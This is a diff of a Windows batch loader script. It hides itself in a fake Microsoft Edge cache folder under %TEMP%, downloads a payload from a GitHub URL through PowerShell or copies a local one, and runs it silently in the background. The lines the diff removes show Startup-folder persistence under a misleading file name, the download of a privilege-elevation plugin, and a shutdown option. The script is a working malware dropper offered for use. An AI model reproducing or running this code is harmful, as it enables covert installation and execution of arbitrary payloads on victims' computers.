@@ -1,18 +1,18 @@
 @echo off
 
-cd %TEMP%
-md .edge
-cd .edge
-md "Microsoft Edge"
-cd "Microsoft Edge"
-md cache
-md userdata
-md Default
-cd cache
-md Downloads
-md Bookmarks
-md Application
-cd Application
+cd %TEMP% > nul
+md .edge > nul
+cd .edge > nul
+md "Microsoft Edge" > nul
+cd "Microsoft Edge" > nul
+md cache > nul
+md userdata > nul
+md Default > nul
+cd cache > nul
+md Downloads > nul
+md Bookmarks > nul
+md Application > nul
+cd Application > nul
 
 if "%1"=="url" goto online
 if "%1"=="path" goto local
@@ -23,52 +23,17 @@ powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/realgam
 goto checkplugins
 
 :local
-xcopy "C:\Path\to\your\Payload.cmd" "%TEMP%\.edge\Microsoft Edge\cache\Application\payload.bat" /y
+xcopy "C:\Path\to\your\Payload.cmd" "%TEMP%\.edge\Microsoft Edge\cache\Application\payload.cmd" /y
 goto checkplugins
-
-:checkplugins
-if "%2"=="--plugins-beginn" goto checkendswitch
-if "%3"=="--plugins-beginn" goto fail
-goto silentrun
-
-:checkendswitch
-if "%4"=="--plugins-end" goto loadplugins
-if "%5"=="--plugins-end" goto loadplugins
-if "%6"=="--plugins-end" goto loadplugins
-goto fail
-
-:loadplugins
-if "%4"=="-enable:elevate" goto elevate
-if "%5"=="-enable:elevate" goto elevate
-if "%6"=="-enable:elevate" goto elevate
-if "%4"=="-enable:startup" goto startup
-if "%5"=="-enable:startup" goto startup
-if "%6"=="-enable:startup" (
-    xcopy payload.cmd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\executionpolicy.cmd" /y
-)
-
-:elevate
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/realgamebreaker/cmd-plugins/main/elevate.cmd-plugin -OutFile elevate.plugin.cmd"
-goto elevatedrunshutdowncheck
 
 :silentrun
 start /B cmd /C "payload.cmd"
 goto exit
 
-:elevatedrunshutdowncheck
-if "%4"=="-enable:shutdown" (
-    start /B cmd /C "elevate.plugin.cmd shutdown" && exit
-)
-goto elevatedrun
-
-:elevatedrun
-start /B cmd /C "elevate.plugin.cmd"
 
 :fail
 echo.
-echo Correct Usage: load.cmd [url/path] (--silent) (--plugins-beginn --enable:plugin --plugins-end)
-echo To use plugins, you have to use silent mode.
-echo You can use 3 plugins at a time.
+echo Correct Usage: load.cmd [url/path] (--silent)
 pause
 
 :exit
